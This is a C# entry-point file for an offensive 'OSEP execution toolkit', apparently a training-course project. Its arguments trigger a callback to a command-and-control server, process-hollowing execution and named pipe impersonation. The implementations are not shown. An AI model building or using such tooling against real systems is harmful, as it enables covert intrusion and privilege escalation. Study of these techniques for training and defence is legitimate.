using System;

namespace Run
{
    public class Code
    {
        public static void Main(string[] args)
        {
            string arg = "";
            if (args.Length < 1)
            {
                Console.WriteLine("######### D3van OSEP execution toolkit ##########");
                Console.WriteLine("Argument Needed:");
                Console.WriteLine("~exec~ to call c2 server");
                Console.WriteLine("~pipe~ to launch named pipe impersonation");
            }
            else
            {
                arg = args[0];
            }

            if (arg.Equals("exec"))
            {
                if (args.Length > 1)
                    Execution.Func.EvasiveExecution.Prepare(args[1]).Wait();
                else
                    Console.WriteLine("host needed");
                return;
            }

            if (arg.Equals("hollow"))
            {
                Execution.Func.EvasiveExecution.ProcessHollowingExec();
            }

            if (arg.Equals("pipe"))
            {
                if (args.Length > 1)
                {
                    Execution.Func.NamedPipeImpersonation.CreatePipe(args[1]);
                }                
            }
            
        }
    }
}